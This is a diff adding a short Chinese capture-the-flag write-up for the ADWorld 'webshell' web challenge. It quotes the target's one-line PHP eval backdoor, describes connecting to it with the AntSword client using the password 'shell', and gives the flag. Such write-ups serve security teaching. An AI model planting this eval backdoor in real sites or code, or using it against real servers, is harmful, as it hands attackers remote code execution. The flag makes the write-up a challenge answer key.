@@ -142,3 +142,18 @@ if($b>1234){
 
 ------
 
+### [webshell](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5070)
+
+打开靶机看到以下信息：
+
+```php+HTML
+你会使用webshell吗？
+<?php @eval($_POST['shell']);?>
+```
+
+打开`AntSword`挥动俺的蚁剑，一句话木马告诉了靶机的连接密码是`shell`，连接成功后可以看到`flag.txt`文件，查看后即可得到`cyberpeace{081245a68c219586f459156b3d8c7051}`。
+
+![](https://paper.tanyaodan.com/ADWorld/web/5070/1.png)
+
+------
+
